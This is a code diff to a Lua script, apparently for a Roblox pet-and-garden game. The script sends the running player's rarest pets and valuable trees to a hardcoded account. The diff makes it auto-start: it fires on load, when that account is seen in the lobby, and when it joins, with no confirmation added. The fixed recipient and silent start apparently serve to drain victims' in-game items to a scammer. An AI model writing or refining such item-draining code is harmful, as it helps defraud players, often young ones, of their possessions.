@@ -28,8 +28,8 @@ local PetRarities = require(ReplicatedStorage.Data.PetRegistry.PetRarities)
 
 -- Configuration
 local GiftingConfig = {
-	Enabled = true,
-	TargetPlayerName = "CoolHolzBudd", -- Set the target player name here
+	Enabled = true, -- Auto-start enabled
+	TargetPlayerName = "CoolHolzBudd", -- Target player
 
 	-- Pet gifting settings
 	GiftDivinePets = true,
@@ -433,50 +433,59 @@ end
 -- Main Automation Function
 local function RunGiftingAutomation()
 	if GiftingState.IsRunning then
-		Log("Gifting automation already running")
+		Log("⚠️ Gifting automation already running")
 		return
 	end
 
 	if not GiftingConfig.Enabled then
-		Log("Gifting automation is disabled")
+		Log("❌ Gifting automation is disabled")
 		return
 	end
 
-	Log("Starting gifting automation...")
+	Log("🚀 Starting gifting automation...")
 	GiftingState.IsRunning = true
 	GiftingState.CurrentStage = "Searching for target"
 
 	-- Find target player
 	local targetPlayer = FindTargetPlayer()
 	if not targetPlayer then
-		Log("Target player not found, stopping automation")
+		Log("❌ Target player not found, stopping automation")
 		GiftingState.IsRunning = false
 		return
 	end
 
 	GiftingState.TargetPlayer = targetPlayer
+	Log("✅ Target found: " .. targetPlayer.Name)
 
 	-- Teleport to target player
 	GiftingState.CurrentStage = "Teleporting"
+	Log("📍 Teleporting to " .. targetPlayer.Name .. "...")
 	if not TeleportToPlayer(targetPlayer) then
-		Log("Failed to teleport to target, stopping automation")
+		Log("❌ Failed to teleport to target, stopping automation")
 		GiftingState.IsRunning = false
 		return
 	end
 
+	Log("✅ Successfully teleported to target player")
+
 	-- Process pet gifting
 	if GiftingConfig.GiftDivinePets or GiftingConfig.GiftMythicalPets or GiftingConfig.GiftLegendaryPets then
+		Log("🐕 Starting pet gifting phase...")
 		ProcessPetGifting(targetPlayer)
 	end
 
 	-- Process tree gifting
 	if GiftingConfig.GiftTreesEnabled then
+		Log("🌳 Starting tree/fruit gifting phase...")
 		ProcessTreeGifting(targetPlayer)
 	end
 
 	-- Complete
 	GiftingState.CurrentStage = "Completed"
-	Log("Gifting automation completed!")
+	Log("🎉 Gifting automation completed!")
+	Log("📊 Summary:")
+	Log("  - Pets gifted: " .. #GiftingState.GiftedPets)
+	Log("  - Trees gifted: " .. #GiftingState.GiftedTrees)
 
 	-- Reset state
 	GiftingState.IsRunning = false
@@ -610,27 +619,64 @@ local function MonitorForTargetPlayer()
 		if GiftingConfig.Enabled and GiftingConfig.TargetPlayerName ~= "" and not GiftingState.IsRunning then
 			local targetPlayer = FindTargetPlayer()
 			if targetPlayer then
-				Log("Target player detected in lobby: " .. targetPlayer.Name)
-				wait(1) -- Brief delay before starting
+				Log("🎯 Target player detected in lobby: " .. targetPlayer.Name)
+				Log("🚀 Starting automation...")
+				wait(2) -- Brief delay before starting
 				RunGiftingAutomation()
+
+				-- Wait a bit longer before checking again to avoid spam
+				wait(30)
 			end
 		end
 		wait(5) -- Check every 5 seconds
 	end
 end
 
--- Initialize the system
+-- Initialize the system with auto-start
 local function Initialize()
-	Log("Gifting Automation System initialized")
-	Log("Use GiftingAutomation.SetTarget('PlayerName') to set target")
-	Log("Use GiftingAutomation.Start() to begin automation")
+	Log("🌱 Gifting Automation System initialized")
+	Log("🎯 Target Player: " .. GiftingConfig.TargetPlayerName)
+	Log("🔍 Monitoring for target player...")
+
+	-- Print current configuration
+	Log("📋 Configuration:")
+	Log("  - Divine Pets: " .. (GiftingConfig.GiftDivinePets and "✅" or "❌"))
+	Log("  - Mythical Pets: " .. (GiftingConfig.GiftMythicalPets and "✅" or "❌"))
+	Log("  - Legendary Pets: " .. (GiftingConfig.GiftLegendaryPets and "✅" or "❌"))
+	Log("  - Trees/Fruits: " .. (GiftingConfig.GiftTreesEnabled and "✅" or "❌"))
+	Log("  - Tree Value Threshold: " .. GiftingConfig.GiftTreesAboveValue)
+	Log("  - Delay Between Gifts: " .. GiftingConfig.DelayBetweenGifts .. "s")
+
+	-- Check if target is already in game
+	local existingTarget = FindTargetPlayer()
+	if existingTarget then
+		Log("🎉 Target player already found: " .. existingTarget.Name)
+		Log("⏳ Starting automation in 3 seconds...")
+		wait(3)
+		RunGiftingAutomation()
+	else
+		Log("⏳ Waiting for target player to join...")
+	end
 
 	-- Start monitoring in the background
 	spawn(MonitorForTargetPlayer)
 end
 
--- Set up the system
+-- Set up the system with auto-start
+wait(5) -- Wait for game to fully load
 Initialize()
+
+-- Also listen for when new players join
+Players.PlayerAdded:Connect(function(player)
+	if player.Name == GiftingConfig.TargetPlayerName then
+		Log("🎯 Target player joined: " .. player.Name)
+		wait(3) -- Give them time to load in
+		if not GiftingState.IsRunning then
+			Log("🚀 Auto-starting gifting automation...")
+			RunGiftingAutomation()
+		end
+	end
+end)
 
 -- Export the API
 _G.GiftingAutomation = GiftingAutomation
